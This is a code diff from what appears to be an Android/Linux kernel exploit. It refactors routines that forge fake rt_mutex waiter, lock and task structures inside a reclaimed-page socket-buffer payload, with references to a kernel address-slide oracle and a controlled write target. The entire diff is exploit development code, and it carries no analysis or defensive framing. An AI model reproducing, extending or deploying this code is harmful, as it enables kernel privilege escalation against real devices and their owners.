@@ -27,8 +27,7 @@ _Static_assert(
     "slide task bank overlaps lock bank");
 _Static_assert(
     SLIDE_BANK_LOCK_OFF + (SLIDE_BANK_SLOTS - 1) * SLIDE_BANK_SLOT_STRIDE +
-            SLIDE_BANK_WAITER_OFF + FAKE_WAITER_WW_CTX_OFF +
-            sizeof(uint64_t) <=
+            SLIDE_BANK_WAITER_OFF + FAKE_WAITER_LAYOUT_SIZE <=
         ORDER3_SIZE,
     "slide lock bank exceeds reclaimed page");
 #endif
@@ -48,6 +47,40 @@ uintptr_t slide_oracle_target;
 uintptr_t p0_gate_page_struct;
 uintptr_t p0_probe_page_struct;
 char ashmem_path[256] = "/dev/ashmem";
+
+static void put_fake_waiter(unsigned char *payload, size_t waiter_off,
+                            uintptr_t tree_parent, uintptr_t tree_right,
+                            uintptr_t tree_left, uintptr_t pi_parent,
+                            uintptr_t pi_right, uintptr_t pi_left,
+                            uintptr_t task, uintptr_t lock,
+                            uint32_t priority) {
+  put64(payload, waiter_off + 0x00, tree_parent);
+  put64(payload, waiter_off + 0x08, tree_right);
+  put64(payload, waiter_off + 0x10, tree_left);
+#if LEGACY_RT_MUTEX_WAITER
+  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
+        pi_parent);
+  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
+  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
+  put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
+  put64(payload, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
+  put32(payload, waiter_off + FAKE_WAITER_PRIO_OFF, priority);
+  put64(payload, waiter_off + FAKE_WAITER_DEADLINE_OFF, 0);
+#else
+  put32(payload, waiter_off + FAKE_WAITER_TREE_PRIO_OFF, priority);
+  put64(payload, waiter_off + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
+  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
+        pi_parent);
+  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, pi_right);
+  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, pi_left);
+  put32(payload, waiter_off + FAKE_WAITER_PI_TREE_PRIO_OFF, priority);
+  put64(payload, waiter_off + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
+  put64(payload, waiter_off + FAKE_WAITER_TASK_OFF, task);
+  put64(payload, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
+  put32(payload, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
+  put64(payload, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
+#endif
+}
 
 #if defined(APP_PAYLOAD) && APP_PAYLOAD && \
     defined(SLIDE_P0_OFFSET_CANDIDATES)
@@ -97,22 +130,8 @@ static void put_slide_bank_entry(unsigned char *p, uintptr_t payload_base,
   put64(p, lock_off + 0x08, waiter);
   put64(p, lock_off + 0x10, waiter);
   put64(p, lock_off + 0x18, SLIDE_LOCK_OWNER_VALUE);
-  put64(p, waiter_off + 0x00, 1);
-  put64(p, waiter_off + 0x08, 0);
-  put64(p, waiter_off + 0x10, 0);
-  put32(p, waiter_off + FAKE_WAITER_TREE_PRIO_OFF,
-        SLIDE_FAKE_WAITER_PRIO);
-  put64(p, waiter_off + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
-  put64(p, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, parent);
-  put64(p, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 0);
-  put64(p, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, target);
-  put32(p, waiter_off + FAKE_WAITER_PI_TREE_PRIO_OFF,
-        SLIDE_FAKE_WAITER_PRIO);
-  put64(p, waiter_off + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
-  put64(p, waiter_off + FAKE_WAITER_TASK_OFF, task);
-  put64(p, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
-  put32(p, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
-  put64(p, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
+  put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task, lock,
+                  SLIDE_FAKE_WAITER_PRIO);
   put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
   put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
   put32(p, task_off + FAKE_TASK_NORMAL_PRIO_OFF, FAKE_TASK_PRIO);
@@ -579,24 +598,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
         put64(p, lock_off + 0x10, waiter);
         put64(p, lock_off + 0x18, SLIDE_LOCK_OWNER_VALUE);
 
-        put64(p, waiter_off + 0x00, 1);
-        put64(p, waiter_off + 0x08, 0);
-        put64(p, waiter_off + 0x10, 0);
-        put32(p, waiter_off + FAKE_WAITER_TREE_PRIO_OFF,
-              SLIDE_FAKE_WAITER_PRIO);
-        put64(p, waiter_off + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
-        put64(p, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00,
-              parent);
-        put64(p, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, 0);
-        put64(p, waiter_off + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10,
-              target);
-        put32(p, waiter_off + FAKE_WAITER_PI_TREE_PRIO_OFF,
-              SLIDE_FAKE_WAITER_PRIO);
-        put64(p, waiter_off + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
-        put64(p, waiter_off + FAKE_WAITER_TASK_OFF, task);
-        put64(p, waiter_off + FAKE_WAITER_LOCK_OFF, lock);
-        put32(p, waiter_off + FAKE_WAITER_WAKE_STATE_OFF, 0);
-        put64(p, waiter_off + FAKE_WAITER_WW_CTX_OFF, 0);
+        put_fake_waiter(p, waiter_off, 1, 0, 0, parent, 0, target, task,
+                        lock, SLIDE_FAKE_WAITER_PRIO);
 
         put32(p, task_off + FAKE_TASK_USAGE_OFF, 0x100);
         put32(p, task_off + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
@@ -692,20 +695,8 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
       put64(p, LOCK_OFF + 0x18, fake_task | 1);
     }
 
-    put64(p, W0_OFF + 0x00, 1);
-    put64(p, W0_OFF + 0x08, 0);
-    put64(p, W0_OFF + 0x10, 0);
-    put32(p, W0_OFF + FAKE_WAITER_TREE_PRIO_OFF, waiter_prio);
-    put64(p, W0_OFF + FAKE_WAITER_TREE_DEADLINE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x00, write_pc);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x08, write_right);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_ENTRY_OFF + 0x10, write_left);
-    put32(p, W0_OFF + FAKE_WAITER_PI_TREE_PRIO_OFF, waiter_prio);
-    put64(p, W0_OFF + FAKE_WAITER_PI_TREE_DEADLINE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_TASK_OFF, waiter_task);
-    put64(p, W0_OFF + FAKE_WAITER_LOCK_OFF, fake_lock);
-    put32(p, W0_OFF + FAKE_WAITER_WAKE_STATE_OFF, 0);
-    put64(p, W0_OFF + FAKE_WAITER_WW_CTX_OFF, 0);
+    put_fake_waiter(p, W0_OFF, 1, 0, 0, write_pc, write_right, write_left,
+                    waiter_task, fake_lock, waiter_prio);
 
     put32(p, FAKE_TASK_OFF + FAKE_TASK_USAGE_OFF, 0x100);
     put32(p, FAKE_TASK_OFF + FAKE_TASK_PRIO_OFF, FAKE_TASK_PRIO);
